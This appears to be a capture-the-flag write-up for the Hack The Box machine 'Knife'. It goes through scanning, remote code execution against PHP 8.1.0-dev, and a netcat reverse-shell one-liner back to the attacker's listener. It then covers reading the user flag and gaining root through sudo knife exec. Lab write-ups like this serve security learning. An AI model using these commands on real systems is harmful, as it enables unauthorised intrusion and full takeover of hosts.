@@ -1,0 +1,150 @@
+1)Enumeration / Reconnaisance
+tool : nmap , nikto
+┌──(kali㉿kali)-[~/Desktop/htb]
+└─$ nmap -A -T5 10.10.10.242
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-08 17:40 IST
+Warning: 10.10.10.242 giving up on port because retransmission cap hit (2).
+Stats: 0:10:40 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
+Connect Scan Timing: About 65.67% done; ETC: 17:56 (0:05:27 remaining)
+Stats: 0:10:43 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
+Connect Scan Timing: About 66.07% done; ETC: 17:56 (0:05:23 remaining)
+Stats: 0:11:04 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
+Connect Scan Timing: About 77.33% done; ETC: 17:54 (0:03:10 remaining)
+Stats: 0:11:07 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
+Connect Scan Timing: About 99.99% done; ETC: 17:51 (0:00:00 remaining)
+Stats: 0:11:15 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 86.71% done; ETC: 17:51 (0:00:00 remaining)
+Stats: 0:11:17 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 93.01% done; ETC: 17:51 (0:00:00 remaining)
+Stats: 0:11:17 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 94.41% done; ETC: 17:51 (0:00:00 remaining)
+Stats: 0:11:18 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 97.90% done; ETC: 17:51 (0:00:00 remaining)
+Stats: 0:11:23 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 98.60% done; ETC: 17:51 (0:00:00 remaining)
+Stats: 0:11:26 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 99.30% done; ETC: 17:51 (0:00:00 remaining)
+Stats: 0:11:31 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 87.50% done; ETC: 17:51 (0:00:00 remaining)
+Nmap scan report for 10.10.10.242
+Host is up (0.25s latency).
+Not shown: 739 filtered ports, 260 closed ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title:  Emergent Medical Idea
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 692.58 seconds
+                                                                 
+
+──(kali㉿kali)-[~]
+└─$ nikto -h 10.10.10.242
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.10.242
++ Target Hostname:    10.10.10.242
++ Target Port:        80
++ Start Time:         2021-08-08 17:41:37 (GMT5.5)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.41 (Ubuntu)
++ Retrieved x-powered-by header: PHP/8.1.0-dev
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
+
+
+
+Gaining access
+
+Discovering about php/8.1.0 dev
+There is an exploit written in python3
+Executing the exploit                                                                                                                                                                                                                                             
+┌──(kali㉿kali)-[~/Desktop/htb]
+└─$ python3 php8rce.py
+Enter the full host url:
+http://10.10.10.242
+
+Interactive shell is opened on http://10.10.10.242 
+Can't acces tty; job crontol turned off.
+$ id
+uid=1000(james) gid=1000(james) groups=1000(james)
+
+$ 
+Checking for privesc
+$ sudo -l
+Matching Defaults entries for james on knife:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User james may run the following commands on knife:
+    (root) NOPASSWD: /usr/bin/knife
+
+ Searching about knife
+$ knife exec -E 'exec "/bin/sh"'
+No input file specified.
+
+This  error Ughh!! 
+let's try to enable that by spawning netcat reverse shell and listening on different port 
+
+$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $MyIp 1234 > /tmp/f
+                                                                                                                          
+┌──(kali㉿kali)-[~]
+└─$ nc -lnvp 1234                                                                                                     1 ⚙
+listening on [any] 1234 ...
+connect to [10.10.16.7] from (UNKNOWN) [10.10.10.242] 39614
+/bin/sh: 0: can't access tty; job control turned off
+$ python -c 'import pty; pty.spawn("/bin/sh")'
+/bin/sh: 1: python: not found
+$ 
+
+
+$ python -c 'import pty; pty.spawn("/bin/sh")'
+/bin/sh: 1: python: not found
+
+Now This error !!
+
+Trying python3
+python3 -c 'import pty ; pty.spawn("/bin/bash");'
+james@knife:/$ 
+FINALLY !!!
+Reading files 
+maybe in home directory maybe present 
+james@knife:~$ ls
+ls
+10.10.14.4:1500  script.rb  test,rb  test.rb  user.txt
+james@knife:~$ cat user.txt
+cat user.txt
+7fd29e0e6aeb6c16720f2a902d8db4a0
+james@knife:~$ 
+
+
+james@knife:~$ sudo -l
+sudo -l
+Matching Defaults entries for james on knife:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User james may run the following commands on knife:
+    (root) NOPASSWD: /usr/bin/knife
+
+
+Privelige escalation :
+
+Trying getting root using knife
+Command on gtfobins
+
+james@knife:~$ sudo knife exec -E 'exec "/bin/sh"'
+sudo knife exec -E 'exec "/bin/sh"'
+# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+# whoami
+whoami
+root
+# python3 -c 'import pty ; pty.spawn("/bin/bash");
+python3 -c 'import pty ; pty.spawn("/bin/bash");
+> '
+'
+root@knife:/home/james# 
+
